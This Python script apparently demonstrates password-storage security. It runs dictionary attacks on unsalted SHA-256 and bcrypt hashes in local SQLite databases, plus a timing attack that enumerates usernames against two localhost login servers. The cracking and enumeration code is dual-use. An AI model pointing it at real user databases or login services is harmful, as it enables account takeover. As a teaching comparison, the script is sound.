import hashlib
import sqlite3
import bcrypt
import time
import requests

def register_test_users():
    print("Registering test users...")
    test_users = [
        {"username": "alice", "password": "password123"},
        {"username": "bob", "password": "letmein"},
        {"username": "carol", "password": "sunshine"}
    ]
    for user in test_users:
        # Register on insecure server
        try:
            response = requests.post("http://localhost:5000/register", json=user)
            print(f"Insecure: {response.json()}")
        except:
            print("Insecure server not running or error registering")
        # Register on secure server
        try:
            response = requests.post("http://localhost:5001/register", json=user)
            print(f"Secure: {response.json()}")
        except:
            print("Secure server not running or error registering")

def dictionary_attack_insecure():
    print("\n=== ATTACK 1: Dictionary Attack on Insecure System (SHA-256, no salt) ===")
    conn = sqlite3.connect("insecure_users.db")
    rows = conn.execute("SELECT username, password_hash FROM users").fetchall()
    if not rows:
        print("No users in insecure database. Register some users first.")
        return
    with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
        wordlist = [line.strip() for line in f.readlines()]
    cracked = 0
    start = time.time()
    for username, stored_hash in rows:
        for word in wordlist:
            attempt = hashlib.sha256(word.encode()).hexdigest()
            if attempt == stored_hash:
                print(f"  CRACKED: {username} -> password is: {word}")
                cracked += 1
                break
    elapsed = time.time() - start
    print(f"  Cracked {cracked}/{len(rows)} passwords in {elapsed:.2f} seconds")

def dictionary_attack_secure():
    print("\n=== ATTACK 2: Dictionary Attack on Secure System (bcrypt + salt) ===")
    conn = sqlite3.connect("secure_users.db")
    rows = conn.execute("SELECT username, password_hash FROM users").fetchall()
    if not rows:
        print("No users in secure database. Register some users first.")
        return
    with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
        wordlist = [line.strip() for line in f.readlines()[:50]]
    cracked = 0
    start = time.time()
    for username, stored_hash in rows:
        for word in wordlist:
            if bcrypt.checkpw(word.encode(), stored_hash.encode()):
                print(f"  CRACKED: {username} -> password is: {word}")
                cracked += 1
                break
        else:
            print(f"  {username}: not cracked in first 50 attempts")
    elapsed = time.time() - start
    print(f"  Attempted 50 guesses per user in {elapsed:.2f} seconds")
    print(f"  Compare that to SHA-256 which checked 10000 in similar time.")

def timing_attack():
    print("\n=== ATTACK 3: Timing Attack to Enumerate Usernames ===")
    print("  Testing insecure system (port 5000)...")
    valid_times = []
    invalid_times = []
    for _ in range(5):
        start = time.time()
        requests.post("http://localhost:5000/login", json={"username": "alice", "password": "wrong"})
        valid_times.append(time.time() - start)
    for _ in range(5):
        start = time.time()
        requests.post("http://localhost:5000/login", json={"username": "doesnotexist999", "password": "wrong"})
        invalid_times.append(time.time() - start)
    avg_valid = sum(valid_times) / len(valid_times)
    avg_invalid = sum(invalid_times) / len(invalid_times)
    print(f"  Avg response time for VALID username:   {avg_valid:.4f}s")
    print(f"  Avg response time for INVALID username: {avg_invalid:.4f}s")
    print(f"  Difference: {abs(avg_valid - avg_invalid):.4f}s")
    if avg_valid > avg_invalid + 0.001:
        print("  RESULT: Timing difference detected. Attacker can enumerate valid usernames.")
    else:
        print("  RESULT: No significant timing difference detected.")

    print("\n  Testing secure system (port 5001)...")
    valid_times = []
    invalid_times = []
    for _ in range(5):
        start = time.time()
        requests.post("http://localhost:5001/login", json={"username": "alice", "password": "wrong"})
        valid_times.append(time.time() - start)
    for _ in range(5):
        start = time.time()
        requests.post("http://localhost:5001/login", json={"username": "doesnotexist999", "password": "wrong"})
        invalid_times.append(time.time() - start)
    avg_valid = sum(valid_times) / len(valid_times)
    avg_invalid = sum(invalid_times) / len(invalid_times)
    print(f"  Avg response time for VALID username:   {avg_valid:.4f}s")
    print(f"  Avg response time for INVALID username: {avg_invalid:.4f}s")
    print(f"  Difference: {abs(avg_valid - avg_invalid):.4f}s")
    if abs(avg_valid - avg_invalid) < 0.05:
        print("  RESULT: No significant timing difference. Constant-time comparison is working.")
    else:
        print("  RESULT: Some timing difference remains.")

if __name__ == "__main__":
    print("Starting attack demo...")
    register_test_users()
    dictionary_attack_insecure()
    dictionary_attack_secure()
    timing_attack()